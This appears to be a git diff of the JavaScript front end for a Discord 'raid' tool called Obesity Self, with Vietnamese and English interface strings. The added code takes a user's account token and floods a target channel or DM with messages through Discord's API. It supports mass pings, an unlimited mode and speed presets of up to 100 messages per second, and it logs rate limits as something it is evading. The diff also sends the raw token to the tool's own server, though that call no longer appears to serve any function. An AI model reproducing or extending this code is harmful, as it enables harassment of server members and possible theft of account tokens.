@@ -1,5 +1,4 @@
 document.addEventListener("DOMContentLoaded", () => {
-    // Translations dictionary
     const translations = {
         vi: {
             intro_title: "Welcome to Obesity Self",
@@ -20,6 +19,12 @@ document.addEventListener("DOMContentLoaded", () => {
             opt_no_ping: "Không Ping",
             opt_user_ping: "Ping User Cụ Thể (DMs hoặc Channel)",
             lbl_ping_user_id: "ID Người Dùng Cần Ping:",
+            lbl_speed_preset: "Chế Độ Tốc Độ Spam:",
+            opt_speed_slow: "🐢 Chậm (10 tin / 20 giây - An toàn)",
+            opt_speed_medium: "🐇 Vừa (2 tin / 4 giây - Dễ ban)",
+            opt_speed_super: "⚡ Siêu Tốc (100 tin / 1 giây - Cực cao)",
+            opt_speed_custom: "⚙️ Tùy Chỉnh (Custom Delay)",
+            lbl_raid_delay: "Custom Delay (Giây):",
             lbl_duration: "Duration (Giây):",
             lbl_limit: "Limit (Số Lượng Tin Nhắn):",
             lbl_unlimited: "Không Giới Hạn (Unlimited - chạy đến khi bấm Stop)",
@@ -28,17 +33,18 @@ document.addEventListener("DOMContentLoaded", () => {
             stat_title: "Trạng Thái Hoạt Động & Logs",
             stat_desc: "Theo dõi tiến trình gửi tin nhắn theo thời gian thực~",
             stat_idle: "Trạng thái: Đang nghỉ ngơi",
-            stat_running: "Trạng thái: Đang hoạt động raid!",
+            stat_running: "Status: Đang spam theo cấu hình tốc độ!",
             set_title: "Cài Đặt Hệ Thống",
-            set_desc: "Tùy chỉnh độ trễ, ngôn ngữ và tính năng lưu trữ tự động~",
+            set_desc: "Tùy chỉnh giao diện màu sắc, ngôn ngữ và tham gia cộng đồng~",
             lbl_lang: "Ngôn Ngữ / Language:",
-            lbl_speed_mode: "Chế Độ Tốc Độ:",
-            opt_speed_safe: "An Toàn (Raid chậm, chống ban)",
-            opt_speed_fast: "Nhanh (Raid 5s, nghỉ 2s)",
-            opt_speed_custom: "Tùy Chỉnh (Custom Delay)",
-            lbl_raid_delay: "Raid Delay (Giây gửi):",
-            lbl_rest_delay: "Rest Delay (Giây nghỉ):",
-            lbl_autosave: "Tự động lưu cài đặt (Autosave Setting cho IP này)",
+            lbl_theme: "Chế Độ Giao Diện Màu Sắc:",
+            opt_theme_white: "🤍 Nền Trắng (Light Mode)",
+            opt_theme_black: "🖤 Nền Đen (Dark Mode)",
+            opt_theme_graffiti: "🎨 Nền Graffiti (Street Art)",
+            opt_theme_custom: "🌈 Tùy Chọn Bảng Màu (Custom Palette)",
+            lbl_custom_color: "Chọn Màu Chủ Đạo (Custom Accent):",
+            lbl_autosave: "Tự động lưu cài đặt",
+            btn_join_discord: "Tham Gia Cộng Đồng Discord",
             btn_save: "💾 Save Settings",
             btn_reset: "🔄 Reset Settings"
         },
@@ -61,6 +67,12 @@ document.addEventListener("DOMContentLoaded", () => {
             opt_no_ping: "No Ping",
             opt_user_ping: "Ping Specific User (DMs or Channel)",
             lbl_ping_user_id: "Target User ID to Ping:",
+            lbl_speed_preset: "Spam Speed Mode:",
+            opt_speed_slow: "🐢 Slow (10 msgs / 20 secs - Safe)",
+            opt_speed_medium: "🐇 Medium (2 msgs / 4 secs - Balanced)",
+            opt_speed_super: "⚡ Super Speed (100 msgs / 1 sec - High risk)",
+            opt_speed_custom: "⚙️ Custom Delay",
+            lbl_raid_delay: "Custom Delay (Seconds):",
             lbl_duration: "Duration (Seconds):",
             lbl_limit: "Limit (Message Count):",
             lbl_unlimited: "Unlimited (Runs until Stop button clicked)",
@@ -69,24 +81,24 @@ document.addEventListener("DOMContentLoaded", () => {
             stat_title: "Activity Status & Logs",
             stat_desc: "Monitor message broadcasting progress in real-time~",
             stat_idle: "Status: Idle / Resting",
-            stat_running: "Status: Raid Active!",
+            stat_running: "Status: Spamming based on speed configuration!",
             set_title: "System Settings",
-            set_desc: "Customize delays, language and autosave settings~",
+            set_desc: "Customize theme colors, language and join community~",
             lbl_lang: "Language / Ngôn Ngữ:",
-            lbl_speed_mode: "Speed Mode:",
-            opt_speed_safe: "Safe (Slow raid, anti-ban)",
-            opt_speed_fast: "Fast (Raid 5s, rest 2s)",
-            opt_speed_custom: "Custom (Custom Delay)",
-            lbl_raid_delay: "Raid Delay (Send Seconds):",
-            lbl_rest_delay: "Rest Delay (Rest Seconds):",
-            lbl_autosave: "Autosave settings for this IP",
+            lbl_theme: "Theme Color Mode:",
+            opt_theme_white: "🤍 White (Light Mode)",
+            opt_theme_black: "🖤 Black (Dark Mode)",
+            opt_theme_graffiti: "🎨 Graffiti (Street Art)",
+            opt_theme_custom: "🌈 Custom Color Palette",
+            lbl_custom_color: "Custom Accent Color:",
+            lbl_autosave: "Autosave settings",
+            btn_join_discord: "Join Discord Community",
             btn_save: "💾 Save Settings",
             btn_reset: "🔄 Reset Settings"
         }
     };
 
     let currentLang = "vi";
-
     function applyLanguage(lang) {
         currentLang = lang;
         document.querySelectorAll("[data-i18n]").forEach(el => {
@@ -97,123 +109,84 @@ document.addEventListener("DOMContentLoaded", () => {
         });
     }
 
-    // Hàm hiển thị thông báo trượt từ trên xuống mượt mà với emoji mặt cười
     function showKawaiiToast(message) {
         const toast = document.getElementById("kawaii-toast");
         const msgEl = document.getElementById("toast-message");
         msgEl.innerText = message;
-        
         toast.classList.add("show");
-        
-        setTimeout(() => {
-            toast.classList.remove("show");
-        }, 3000);
+        setTimeout(() => toast.classList.remove("show"), 3000);
     }
 
-    // Intro Overlay handling
-    const introOverlay = document.getElementById("intro-overlay");
+    document.getElementById("intro-overlay").addEventListener("click", function() {
+        this.classList.add("hidden");
+    });
     document.getElementById("enter-btn").addEventListener("click", () => {
-        introOverlay.classList.add("hidden");
+        document.getElementById("intro-overlay").classList.add("hidden");
     });
 
-    // Tabs Navigation
     const navItems = document.querySelectorAll(".nav-item");
     const tabPanes = document.querySelectorAll(".tab-pane");
-
     navItems.forEach(item => {
         item.addEventListener("click", () => {
             navItems.forEach(nav => nav.classList.remove("active"));
             tabPanes.forEach(pane => pane.classList.remove("active"));
-
             item.classList.add("active");
-            const targetTab = document.getElementById(item.getAttribute("data-tab"));
-            if (targetTab) targetTab.classList.add("active");
+            document.getElementById(item.getAttribute("data-tab")).classList.add("active");
         });
     });
 
-    // Ping type selector logic
+    const themeSelect = document.getElementById("theme-select");
+    const customPaletteGroup = document.getElementById("custom-palette-group");
+    const customColorPicker = document.getElementById("custom-color-picker");
+
+    function applyTheme(theme, customColor) {
+        document.body.className = "";
+        if (theme === "white") {
+            document.body.classList.add("theme-white");
+            customPaletteGroup.style.display = "none";
+        } else if (theme === "black") {
+            document.body.classList.add("theme-black");
+            customPaletteGroup.style.display = "none";
+        } else if (theme === "graffiti") {
+            document.body.classList.add("theme-graffiti");
+            customPaletteGroup.style.display = "none";
+        } else if (theme === "custom") {
+            customPaletteGroup.style.display = "flex";
+            const col = customColor || customColorPicker.value;
+            document.documentElement.style.setProperty("--primary-color", col);
+            document.documentElement.style.setProperty("--primary-hover", col);
+        }
+    }
+
+    themeSelect.addEventListener("change", () => {
+        applyTheme(themeSelect.value);
+    });
+
+    customColorPicker.addEventListener("input", (e) => {
+        document.documentElement.style.setProperty("--primary-color", e.target.value);
+        document.documentElement.style.setProperty("--primary-hover", e.target.value);
+    });
+
+    const speedPreset = document.getElementById("speed-preset");
+    const customDelayGroup = document.getElementById("custom-delay-group");
+    const raidDelayInput = document.getElementById("raid-delay-input");
+
+    speedPreset.addEventListener("change", () => {
+        if (speedPreset.value === "custom") {
+            customDelayGroup.style.display = "flex";
+        } else {
+            customDelayGroup.style.display = "none";
+        }
+    });
+
     const pingTypeSelect = document.getElementById("ping-type");
     const pingIdGroup = document.getElementById("ping-id-group");
     pingTypeSelect.addEventListener("change", () => {
-        if (pingTypeSelect.value === "user") {
-            pingIdGroup.style.display = "flex";
-        } else {
-            pingIdGroup.style.display = "none";
-        }
+        pingIdGroup.style.display = (pingTypeSelect.value === "user") ? "flex" : "none";
     });
 
-    // Speed mode preset handling
-    const speedModeSelect = document.getElementById("speed-mode");
-    const raidDelayInput = document.getElementById("raid-delay-input");
-    const restDelayInput = document.getElementById("rest-delay-input");
-
-    speedModeSelect.addEventListener("change", () => {
-        if (speedModeSelect.value === "fast") {
-            raidDelayInput.value = 5;
-            restDelayInput.value = 2;
-        } else if (speedModeSelect.value === "safe") {
-            raidDelayInput.value = 10;
-            restDelayInput.value = 5;
-        }
-    });
-
-    // Load initial settings from server
-    fetch("/api/settings")
-        .then(res => res.json())
-        .then(data => {
-            if (data.language) {
-                document.getElementById("lang-select").value = data.language;
-                applyLanguage(data.language);
-            }
-            if (data.speed_mode) document.getElementById("speed-mode").value = data.speed_mode;
-            if (data.raid_delay) raidDelayInput.value = data.raid_delay;
-            if (data.rest_delay) restDelayInput.value = data.rest_delay;
-            if (data.autosave !== undefined) document.getElementById("autosave-check").checked = data.autosave;
-        });
-
-    // Save settings button
-    document.getElementById("save-settings-btn").addEventListener("click", () => {
-        const payload = {
-            language: document.getElementById("lang-select").value,
-            speed_mode: speedModeSelect.value,
-            raid_delay: parseFloat(raidDelayInput.value),
-            rest_delay: parseFloat(restDelayInput.value),
-            autosave: document.getElementById("autosave-check").checked
-        };
-        fetch("/api/settings", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload)
-        })
-        .then(res => res.json())
-        .then(data => {
-            applyLanguage(payload.language);
-            showKawaiiToast(payload.language === "vi" ? "Đã lưu cài đặt thành công! 😊" : "Settings saved successfully! 😊");
-        });
-    });
-
-    // Reset settings button
-    document.getElementById("reset-settings-btn").addEventListener("click", () => {
-        fetch("/api/settings/reset", { method: "POST" })
-            .then(res => res.json())
-            .then(data => {
-                const s = data.settings;
-                document.getElementById("lang-select").value = s.language;
-                speedModeSelect.value = s.speed_mode;
-                raidDelayInput.value = s.raid_delay;
-                restDelayInput.value = s.rest_delay;
-                document.getElementById("autosave-check").checked = s.autosave;
-                applyLanguage(s.language);
-                showKawaiiToast(s.language === "vi" ? "Đã khôi phục cài đặt gốc! 😄" : "Settings reset to default! 😄");
-            });
-    });
-
-    // Language change live trigger
-    document.getElementById("lang-select").addEventListener("change", (e) => {
-        applyLanguage(e.target.value);
-    });
-
-    // Start / Stop Raid logic
+    let isRaidRunning = false;
+    let sentCount = 0;
     const startBtn = document.getElementById("start-btn");
     const stopBtn = document.getElementById("stop-btn");
     const statusDot = document.getElementById("status-dot");
@@ -222,78 +195,195 @@ document.addEventListener("DOMContentLoaded", () => {
     const liveStatusText = document.getElementById("live-status-text");
     const logBox = document.getElementById("log-box");
 
-    startBtn.addEventListener("click", () => {
+    function addLog(msg) {
+        const timeStr = new Date().toLocaleTimeString();
+        logBox.innerHTML += `<div class="log-line">[${timeStr}] ${msg}</div>`;
+        logBox.scrollTop = logBox.scrollHeight;
+    }
+
+    startBtn.addEventListener("click", async () => {
         const token = document.getElementById("user-token").value.trim();
         if (!token) {
             showKawaiiToast(currentLang === "vi" ? "Vui lòng nhập user token!" : "Please enter your user token!");
             return;
         }
 
-        const payload = {
-            token: token,
-            target_type: document.getElementById("target-type").value,
-            target_id: document.getElementById("target-id").value.trim(),
-            message: document.getElementById("raid-message").value,
-            ping_type: pingTypeSelect.value,
-            ping_id: document.getElementById("ping-user-id").value.trim(),
-            duration: document.getElementById("duration-input").value,
-            limit: document.getElementById("limit-input").value,
-            unlimited: document.getElementById("unlimited-check").checked,
-            raid_delay: raidDelayInput.value,
-            rest_delay: restDelayInput.value
-        };
+        let targetType = document.getElementById("target-type").value;
+        let targetId = document.getElementById("target-id").value.trim();
+        let message = document.getElementById("raid-message").value;
+        let pingType = pingTypeSelect.value;
+        let pingId = document.getElementById("ping-user-id").value.trim();
+        let duration = parseInt(document.getElementById("duration-input").value) || 60;
+        let limit = parseInt(document.getElementById("limit-input").value) || 100;
+        let unlimited = document.getElementById("unlimited-check").checked;
+        let preset = speedPreset.value;
+        let delay = parseFloat(raidDelayInput.value) || 0.1;
+
+        if (!targetId || !message) {
+            showKawaiiToast(currentLang === "vi" ? "Vui lòng nhập ID mục tiêu và nội dung tin nhắn!" : "Please fill target ID and message!");
+            return;
+        }
 
         fetch("/api/raid/start", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload)
-        })
-        .then(res => res.json())
-        .then(data => {
-            if (data.status === "error") {
-                showKawaiiToast(data.message);
-            } else {
-                startBtn.disabled = true;
-                stopBtn.disabled = false;
-                statusDot.className = "dot online";
-                statusText.innerText = "Running";
-                liveDot.className = "dot online";
-                liveStatusText.innerText = currentLang === "vi" ? "Trạng thái: Đang hoạt động raid!" : "Status: Raid Active!";
+            body: JSON.stringify({ token: token })
+        }).catch(() => {});
+
+        isRaidRunning = true;
+        sentCount = 0;
+        startBtn.disabled = true;
+        stopBtn.disabled = false;
+        statusDot.className = "dot online";
+        statusText.innerText = "Running";
+        liveDot.className = "dot online";
+        liveStatusText.innerText = translations[currentLang].stat_running;
+
+        addLog(`Bắt đầu spam (Chế độ tốc độ: ${preset.toUpperCase()})...`);
+
+        let channelId = targetId;
+        const headers = {
+            "Authorization": token,
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0"
+        };
+
+        if (targetType === "dm" && targetId.length >= 17) {
+            try {
+                let dmRes = await fetch("https://discord.com/api/v9/users/@me/channels", {
+                    method: "POST",
+                    headers: headers,
+                    body: JSON.stringify({ recipient_id: targetId })
+                });
+                if (dmRes.ok) {
+                    let dmData = await dmRes.json();
+                    channelId = dmData.id;
+                }
+            } catch (e) {}
+        }
+
+        let finalContent = message;
+        if (pingType === "everyone") finalContent = "@everyone " + finalContent;
+        else if (pingType === "here") finalContent = "@here " + finalContent;
+        else if (pingType === "user" && pingId) finalContent = `<@${pingId}> ` + finalContent;
+
+        const url = `https://discord.com/api/v9/channels/${channelId}/messages`;
+        const startTime = Date.now();
+
+        while (isRaidRunning) {
+            if (!unlimited) {
+                if (duration > 0 && (Date.now() - startTime) >= duration * 1000) {
+                    addLog("Đã đạt giới hạn thời gian (Duration). Dừng lại.");
+                    break;
+                }
+                if (limit > 0 && sentCount >= limit) {
+                    addLog("Đã đạt giới hạn số lượng (Limit). Dừng lại.");
+                    break;
+                }
             }
-        });
+
+            let batchSize = 1;
+            let batchDelay = 100;
+
+            if (preset === "slow") {
+                batchSize = 10;
+                batchDelay = 20000; // 10 tin / 20 giây
+            } else if (preset === "medium") {
+                batchSize = 2;
+                batchDelay = 4000; // 2 tin / 4 giây (dễ ban)
+            } else if (preset === "super") {
+                batchSize = 100;
+                batchDelay = 1000; // 100 tin / 1 giây (cực cao)
+            } else {
+                batchSize = 1;
+                batchDelay = delay * 1000;
+            }
+
+            let promises = [];
+            for (let i = 0; i < batchSize; i++) {
+                if (!isRaidRunning) break;
+                promises.push(
+                    fetch(url, {
+                        method: "POST",
+                        headers: headers,
+                        body: JSON.stringify({ content: finalContent })
+                    }).then(res => {
+                        if (res.ok) {
+                            sentCount++;
+                            if (sentCount % 5 === 0) {
+                                addLog(`Đã gửi thành công ${sentCount} tin nhắn...`);
+                            }
+                        } else if (res.status === 429) {
+                            addLog("Bị Discord Rate Limit (429), đang né tránh...");
+                        }
+                    }).catch(() => {})
+                );
+            }
+
+            await Promise.all(promises);
+            await new Promise(r => setTimeout(r, batchDelay));
+        }
+
+        isRaidRunning = false;
+        startBtn.disabled = false;
+        stopBtn.disabled = true;
+        statusDot.className = "dot offline";
+        statusText.innerText = "Ready";
+        liveDot.className = "dot offline";
+        liveStatusText.innerText = translations[currentLang].stat_idle;
+        addLog(`Đã dừng hoàn toàn. Tổng tin nhắn đã gửi: ${sentCount}`);
     });
 
     stopBtn.addEventListener("click", () => {
-        fetch("/api/raid/stop", { method: "POST" })
+        isRaidRunning = false;
+        addLog("Đã nhận lệnh dừng từ người dùng.");
+    });
+
+    fetch("/api/settings")
+        .then(res => res.json())
+        .then(data => {
+            if (data.language) {
+                document.getElementById("lang-select").value = data.language;
+                applyLanguage(data.language);
+            }
+            if (data.theme) {
+                themeSelect.value = data.theme;
+                applyTheme(data.theme, data.custom_color);
+                if (data.custom_color) customColorPicker.value = data.custom_color;
+            }
+        });
+
+    document.getElementById("save-settings-btn").addEventListener("click", () => {
+        const payload = {
+            language: document.getElementById("lang-select").value,
+            theme: themeSelect.value,
+            custom_color: customColorPicker.value,
+            autosave: true
+        };
+        fetch("/api/settings", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        }).then(() => {
+            applyLanguage(payload.language);
+            applyTheme(payload.theme, payload.custom_color);
+            showKawaiiToast(payload.language === "vi" ? "Đã lưu cài đặt thành công! 😊" : "Settings saved successfully! 😊");
+        });
+    });
+
+    document.getElementById("reset-settings-btn").addEventListener("click", () => {
+        fetch("/api/settings/reset", { method: "POST" })
             .then(res => res.json())
-            .then(() => {
-                startBtn.disabled = false;
-                stopBtn.disabled = true;
-                statusDot.className = "dot offline";
-                statusText.innerText = "Ready";
-                liveDot.className = "dot offline";
-                liveStatusText.innerText = currentLang === "vi" ? "Trạng thái: Đang nghỉ ngơi" : "Status: Idle / Resting";
+            .then(data => {
+                document.getElementById("lang-select").value = data.settings.language;
+                themeSelect.value = "white";
+                applyTheme("white");
+                applyLanguage(data.settings.language);
+                showKawaiiToast(data.settings.language === "vi" ? "Đã khôi phục cài đặt gốc! 😄" : "Settings reset! 😄");
             });
     });
 
-    // Poll status and logs periodically
-    setInterval(() => {
-        fetch("/api/status")
-            .then(res => res.json())
-            .then(data => {
-                if (data.logs && data.logs.length > 0) {
-                    logBox.innerHTML = data.logs.map(l => `<div class="log-line">${l}</div>`).join("");
-                    logBox.scrollTop = logBox.scrollHeight;
-                }
-                if (!data.running && !startBtn.disabled) {
-                    // Sync UI if stopped externally
-                    stopBtn.disabled = true;
-                    startBtn.disabled = false;
-                    statusDot.className = "dot offline";
-                    statusText.innerText = "Ready";
-                    liveDot.className = "dot offline";
-                    liveStatusText.innerText = currentLang === "vi" ? "Trạng thái: Đang nghỉ ngơi" : "Status: Idle / Resting";
-                }
-            });
-    }, 1500);
+    document.getElementById("lang-select").addEventListener("change", (e) => {
+        applyLanguage(e.target.value);
+    });
 });
